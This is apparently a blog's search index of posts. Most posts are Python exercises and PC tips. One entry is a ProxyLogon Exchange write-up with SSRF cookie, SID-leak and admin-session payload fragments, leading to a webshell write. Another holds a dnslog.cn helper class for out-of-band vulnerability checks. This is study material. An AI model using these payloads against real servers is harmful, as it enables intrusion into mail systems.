<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Exchange ProxyLogon RCE</title>
      <link href="//web-an-quan/exchange-proxylogon-rce/"/>
      <url>//web-an-quan/exchange-proxylogon-rce/</url>
      
        <content type="html"><![CDATA[<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ul><li><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/</a></li><li><a href="https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265">https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265</a></li><li><a href="https://github.com/mil1200/ProxyLogon-CVE-2021-26855">https://github.com/mil1200/ProxyLogon-CVE-2021-26855</a></li><li><a href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/</a></li><li><a href="https://www.anquanke.com/post/id/234607">https://www.anquanke.com/post/id/234607</a></li></ul><h3 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h3><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855">CVE-2021-26855</a>是<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855">Exchange</a>中的一个服务器端请求伪造（SSRF）漏洞，它使攻击者能够发送任意HTTP请求并通过Exchange Server进行身份验证。</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857">CVE-2021-26857</a>是统一消息服务中的不安全的反序列化漏洞。不安全的反序列化是不可信的用户可控制数据被程序反序列化的地方。利用此漏洞，HAFNIUM可以在Exchange服务器上以SYSTEM身份运行代码。这需要管理员权限或要利用的另一个漏洞。</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26858">CVE-2021-26858</a>是Exchange中身份验证后的任意文件写入漏洞。如果HAFNIUM可以通过Exchange服务器进行身份验证，则他们可以使用此漏洞将文件写入服务器上的任何路径。他们可以通过利用CVE-2021-26855 SSRF漏洞或通过破坏合法管理员的凭据来进行身份验证。</p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065">CVE-2021-27065</a>是Exchange中身份验证后的任意文件写入漏洞。如果HAFNIUM可以通过Exchange服务器进行身份验证，则他们可以使用此漏洞将文件写入服务器上的任何路径。他们可以通过利用CVE-2021-26855 SSRF漏洞或通过破坏合法管理员的凭据来进行身份验证。</p><h3 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h3><ol><li><p>获取LegacyDN。利用CVE-2021-26855 ssrf攻击。</p><p>使用/Autodiscover/autodiscover.xml入口点来检索请求的输入主体</p><p>payload：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">"Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt; &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>获取SID，并置换成管理员SID。</p><p>使用入口点：/autodiscover/autodiscover.xml和/ mapi / emsmdb</p><p>发生错误时，入口点/ mapi处的功能部件将返回SID</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">mapi_body = legacyDn + \    "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>获取Session id和msExchEcpCanary。CVE-2021-26855</p><p>使用入口点：/ecp/proxyLogon.ecp获取Session ID和Canary</p><p>payload：</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">proxyLogon_request = """&lt;r at="Negotiate" ln="john"&gt;&lt;s&gt;%s&lt;/s&gt;&lt;s a="7" t="1"&gt;S-1-1-0&lt;/s&gt;&lt;s a="7" t="1"&gt;S-1-5-2&lt;/s&gt;&lt;s a="7" t="1"&gt;S-1-5-11&lt;/s&gt;&lt;s a="7" t="1"&gt;S-1-5-15&lt;/s&gt;&lt;s a="3221225479" t="1"&gt;S-1-5-5-0-6948923&lt;/s&gt;&lt;/r&gt;""" % sid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>利用CVE-2021–27065写入webshell</p><p>攻击者使用Exchange管理中心中的ResetOAB功能来写入文件。</p></li></ol><h3 id="细节分析："><a href="#细节分析：" class="headerlink" title="细节分析："></a>细节分析：</h3><ol><li><p>请求/ecp/x.js，请求/ecp下以.js、.css结尾的静态资源，会交由<code>BEResourceRequestHandler</code>处理，确定类是否可以处理请求是基于方法<code>BEResourceRequestHandler.CanHandle()</code>，使用<code>GetBEResouceCookie()</code>方法检查特殊cookie的存在，此方法获取并返回<code>X-BEResource</code>的值。</p><p>然后<code>BEResourceRequestHandler.IsResourceRequest()</code>将检查请求URL是否以资源文件结尾，最后值<code>X-BEResource</code>将继续传递到<code>BackEndServer.FromString()</code>，以确定此请求的后端服务器。</p><p>为了满足上述条件，<code>X-BEResource</code>需要具备下面的形式</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">X-BEResource = EXCHANGE2016〜1942062522<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li></li></ol><h3 id="名词解释："><a href="#名词解释：" class="headerlink" title="名词解释："></a>名词解释：</h3><ul><li>LegacyDN：Exchange Server 2013开始引入，使用邮箱的专有名称标识邮箱</li><li>FQDN：标识内部Exchange服务器的完全限定域名</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web security </tag>
            
            <tag> Exchenge </tag>
            
            <tag> RCE </tag>
            
            <tag> CVE-2021-26855 </tag>
            
            <tag> CVE-2021-27065 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改Users下的文件夹名</title>
      <link href="//blogs/xiu-gai-users-xia-de-wen-jian-jia-ming/"/>
      <url>//blogs/xiu-gai-users-xia-de-wen-jian-jia-ming/</url>
      
        <content type="html"><![CDATA[<ol><li>使用Administrator用户登录系统</li><li>修改注册表中<code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-1049184755-2560237090-294228926-xxxx</code>里ProfileImagePath的内容，就是用户文件夹路径</li><li>然后切换到自己的用户账号，会提示错误，不要慌…..</li><li>将自己的文件夹命名为要修改的名字，然后注销，重新登录</li></ol><p>修改之后会有很多问题，因为很多设置里面都是绝对路径，更改完找不到原来的文件了，比如环境变量等等。</p><p>修改中配置中，</p>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>更换ssd硬盘</title>
      <link href="//blogs/geng-huan-ssd-ying-pan/"/>
      <url>//blogs/geng-huan-ssd-ying-pan/</url>
      
        <content type="html"><![CDATA[<p>电脑上自带的ssd是sn730 500G，实际大小是470多G。要更换的是sn750 1T。我的电脑只有一个m.2的硬盘接口，需要将原来的硬盘克隆到新的硬盘。</p><p>使用<code>DiskGenius</code>克隆硬盘，使用PE模式重启电脑，选择系统迁移，就是系统盘克隆到系统盘，包括引导分区，这样克隆完就可以直接换硬盘，无缝切换。</p><img src="/blogs/geng-huan-ssd-ying-pan/image-20210314210514277.png" class="" title="image-20210314210514277">]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CRLF注入</title>
      <link href="//websecurity/crlf-zhu-ru/"/>
      <url>//websecurity/crlf-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="CRLF简介"><a href="#CRLF简介" class="headerlink" title="CRLF简介"></a>CRLF简介</h3><p>CRLF 指的是回车符(CR，ASCII 13，\r，%0d) 和换行符(LF，ASCII 10，\n，%0a)，操作系统就是根据这个标识来进行换行的，你在键盘输入回车键就是输出这个字符，只不过win和linux系统采用的标识不一样而已。</p><p>在HTTP当中HTTP的Header和Body之间就是用两个crlf进行分隔的，如果能控制HTTP消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF injection 又叫做 HTTP response Splitting，简称HRS。</p>]]></content>
      
      
      <categories>
          
          <category> websecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRLF </tag>
            
            <tag> web security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day40</title>
      <link href="//code/python/pythontip-100days-day40/"/>
      <url>//code/python/pythontip-100days-day40/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day39</title>
      <link href="//code/python/pythontip-100days-day39/"/>
      <url>//code/python/pythontip-100days-day39/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>已知一个有序序列,请原地删除序列中重复出现的元素,返回删除重复元素后的序列长度 要求时间复杂度O(n),空间复杂度O(1)</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">remove_duplicate([0,0,1,1,1,2,2,3,3,4,4,4,5]) -&gt; 6remove_duplicate([0,0,1,1,3,4,5]) -&gt; 5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空，且一定符合题意</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>快速排序变形</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">remove_duplicate</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    tail <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> l<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            l<span class="token punctuation">[</span>tail <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">[</span>i<span class="token punctuation">]</span>            tail <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> tail <span class="token operator">+</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>快速排序变形</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day38</title>
      <link href="//code/python/pythontip-100days-day38/"/>
      <url>//code/python/pythontip-100days-day38/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>有一组数字，从1到n，中减少了一个数，顺序也被打乱，放在一个n-1的数组里，请找出丢失的数字</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">find_missing_num([1,2,3,5]) -&gt; 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空，且一定符合题意</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>位运算</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_missing_num</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">^</span><span class="token operator">=</span> i    <span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>        res <span class="token operator">^</span><span class="token operator">=</span> item    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>位运算</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day37</title>
      <link href="//code/python/pythontip-100days-day37/"/>
      <url>//code/python/pythontip-100days-day37/</url>
      
        <content type="html"><![CDATA[<h1 id="二进制中1的位数"><a href="#二进制中1的位数" class="headerlink" title="二进制中1的位数"></a>二进制中1的位数</h1><p>给定一个整数，请计算二进制中为1的位数</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">count_one_bits(13) -&gt; 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入一定为整数</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>位运算</li><li>移位操作</li></ol><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_one_bits</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 将数字转换为二进制形式    2. 统计二进制字符串中1的个数    :param n:    :return:    """</span>    bin_n <span class="token operator">=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> bin_n<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day36</title>
      <link href="//code/python/pythontip-100days-day36/"/>
      <url>//code/python/pythontip-100days-day36/</url>
      
        <content type="html"><![CDATA[<h1 id="最长上升子序列"><a href="#最长上升子序列" class="headerlink" title="最长上升子序列"></a>最长上升子序列</h1><p>一个元素为数值的列表，找到其最长上升子序列的长度。<br>比如 [5, 4, 1, 2, 5, 3]， 最长上升子序列是 [1, 2, 3], 长度为3。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">get_long_incr_lst(5, 4, 1, 2, 5, 3]) -&gt; 3get_long_incr_lst([10, 9, 2, 5, 3, 7, 101, 18]) -&gt; 4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>动态规划</li></ol><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_long_incr_lst</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    动态规划    1. 寻找所有上升链，将列表中上升元素加入到队列    2. 遍历元素，加入到合适的上升链    :param lst:    :return:    """</span>    <span class="token keyword">def</span> <span class="token function">addlist</span><span class="token punctuation">(</span>uplist<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span> i<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        1. 遍历链条，比较两条末端元素和新元素的大小        2. 如果存在新元素大于链条末尾元素则加入链条，如果遍历完所有链条没能加入，则返回false，申请新添加一条链条        3. 当加入链条时，不会改变原来的链条，而是申请一个copy，然后加入新元素后，将新申请的链条加入到上升链集合中        :param uplist:        :param i:        :return:        """</span>        flag <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> uplist<span class="token punctuation">:</span>            <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token comment"># 获取原来的链条copy</span>                item_copy <span class="token operator">=</span> item<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 生成一条新的上升链</span>                item_copy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> item_copy <span class="token keyword">not</span> <span class="token keyword">in</span> uplist<span class="token punctuation">:</span>                    uplist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item_copy<span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">return</span> flag    <span class="token keyword">if</span> <span class="token keyword">not</span> lst<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    uplist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 上升链集合</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 如果上升链为空，或者元素不能加入已有链条，则申请一条新链条</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> uplist <span class="token keyword">or</span> <span class="token keyword">not</span> addlist<span class="token punctuation">(</span>uplist<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>            uplist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>lst<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>uplist<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">max</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">,</span> uplist<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dnslog</title>
      <link href="//code/python/dnslog/"/>
      <url>//code/python/dnslog/</url>
      
        <content type="html"><![CDATA[<h3 id="python封装dnslog类"><a href="#python封装dnslog类" class="headerlink" title="python封装dnslog类"></a>python封装dnslog类</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dnslog.py</span><span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">dnslog</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_get_dns_domain_api <span class="token operator">=</span> <span class="token string">'http://dnslog.cn/getdomain.php'</span>  <span class="token comment"># 获取子域名</span>        self<span class="token punctuation">.</span>_get_dns_record_api <span class="token operator">=</span> <span class="token string">"http://dnslog.cn/getrecords.php"</span>  <span class="token comment"># 查询dns解析</span>        self<span class="token punctuation">.</span>_headers <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE'</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>        self<span class="token punctuation">.</span>_dns <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 初始化一个session对象</span>        <span class="token comment"># 获取二级域名</span>        self<span class="token punctuation">.</span>_dnssubdomain <span class="token operator">=</span> self<span class="token punctuation">.</span>_dns<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_dns_domain_api<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment"># 标志信息</span>        self<span class="token punctuation">.</span>_msg <span class="token operator">=</span> <span class="token string">'dnstest'</span>    <span class="token keyword">def</span> <span class="token function">getrecords</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""检测是否有dns请求"""</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>_dns<span class="token punctuation">.</span>get<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_get_dns_record_api<span class="token punctuation">,</span>                               headers<span class="token operator">=</span>self<span class="token punctuation">.</span>_headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> self<span class="token punctuation">.</span>_msg <span class="token keyword">in</span> result<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">get_dns_request</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""获取请求的子域名，三级域名"""</span>        <span class="token keyword">return</span> <span class="token string">'http://'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>_msg<span class="token operator">+</span><span class="token string">'.'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>_dnssubdomain    <span class="token keyword">def</span> <span class="token function">setmsg</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""设置三级域名标志位"""</span>        self<span class="token punctuation">.</span>_msg <span class="token operator">=</span> msg    <span class="token keyword">def</span> <span class="token function">senddns</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""发送dns请求"""</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_dns<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>_msg<span class="token operator">+</span><span class="token string">'.'</span> <span class="token operator">+</span>                          self<span class="token punctuation">.</span>_dnssubdomain<span class="token punctuation">,</span> headers<span class="token operator">=</span>self<span class="token punctuation">.</span>_headers<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dnslog </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day35</title>
      <link href="//code/python/pythontip-100days-day35/"/>
      <url>//code/python/pythontip-100days-day35/</url>
      
        <content type="html"><![CDATA[<h1 id="和最接近的分隔位置"><a href="#和最接近的分隔位置" class="headerlink" title="和最接近的分隔位置"></a>和最接近的分隔位置</h1><p>给定一个数组<code>a</code>，返回位置<code>i</code>,使得<code>sum(a[: i + 1])</code>和<code>sum(a[i + 1 : ])</code>最接近</p><p>如果有多个满足条件的位置，返回最小的那个</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">nearest_split_sum([7,3,2,8,0,-1,9]) -&gt; 2nearest_split_sum([1,1,0,1,1]) -&gt; 1nearest_split_sum([1]) -&gt; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入的数组不为空</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用之前的分段和计算新的分段和</li></ol><h3 id="解法1："><a href="#解法1：" class="headerlink" title="解法1："></a>解法1：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">nearest_split_sum</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    1. 遍历分割点，将队列分为前后两部分    2. 计算前后两部分的和，然后使用index和diff记录分割点的索引和前后两部分的差值    3. 比较差值然后改变索引    :param a:    :return:    """</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> a<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span>    index<span class="token punctuation">,</span> diff <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9999999999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp_diff <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token 